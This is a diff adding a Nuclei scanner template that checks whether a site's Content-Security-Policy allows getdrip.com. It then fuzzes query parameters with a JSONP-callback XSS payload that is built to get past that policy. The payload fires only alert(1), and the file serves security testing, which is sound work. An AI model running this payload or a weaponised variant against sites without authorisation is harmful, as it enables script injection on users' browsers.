@@ -1,0 +1,55 @@
+id: getdrip-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - GetDrip API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,getdrip-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "getdrip.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: getdrip_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "getdrip_api_csp_xss == true"
+# digest: 4a0a00473045022005a32bdd8a9d3976ffa5461ac2845aabe31da20af7b6404e044556becd961599022100a4a8cc7dbfeb8c7c375294e6cf4a804e21b7c9b5e6bace6c5b5ab7e74adcafde:922c64590222798bb761d5b6d8e72950
